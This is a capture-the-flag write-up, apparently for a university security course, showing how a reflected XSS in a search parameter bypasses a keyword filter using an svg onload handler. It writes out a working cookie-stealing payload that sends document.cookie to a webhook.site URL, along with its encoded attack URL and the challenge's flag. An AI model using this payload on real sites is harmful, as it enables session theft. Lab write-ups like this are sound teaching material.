# Challenge `Give me more than a simple WAF` Writeup

- Vulnerability: 
  - XSS attack
- Where:
  - Feedback link input
- Impact:
  - allows to steal remote user's cookie

## Analyzing the server

This challenges consists in grabbing the admins' cookies but this time certain keywords are being filtered out.
From the previous challenge, we know that the server is vulnerable to XSS attacks.
The feedback feature allows us to submit a link that the admin will click on.

## Exploit

Knowing that the admin will click on the link, it's possible to take advantage of the search URL parameter 
`?search=` to send a malicious payload that will reveal the cookies on his browser and then send them
to us.
This time we can't create a payload with the keyword `script` or `img` so we will use the `svg` tag with the `onload` function to execute the JavaScript code.
Using the same technique as before, create a payload that sends a requesto a webhook URL:
`<svg onload="location='https://webhook.site/your-unique-id/'+document.cookie"/>`
Encode it:
`%3Csvg%20onload%3D%22location%3D%27https%3A%2F%2Fwebhook.site%2Fyour-unique-id%2F%27%2Bdocument.cookie%22%2F%3E`
Finally, append it to the URL parameter `?search=` and submit it to the admin.
`http://mustard.stt.rnl.tecnico.ulisboa.pt:22251/?search=%3Csvg%20onload%3D%22location%3D%27https%3A%2F%2Fwebhook.site%2Fyour-unique-id%2F%27%2Bdocument.cookie%22%2F%3E`
In the webhook site, a GET request will show up with the cookie in the URL
`	https://webhook.site/your-unique-id/SECRET=SSof%7BBut_I_was_told_that_this_WAF_was_all_I_needed...%7D` revealing the  
flag `SSof{But_I_was_told_that_this_WAF_was_all_I_needed...}`.

## Implementation

No script needed.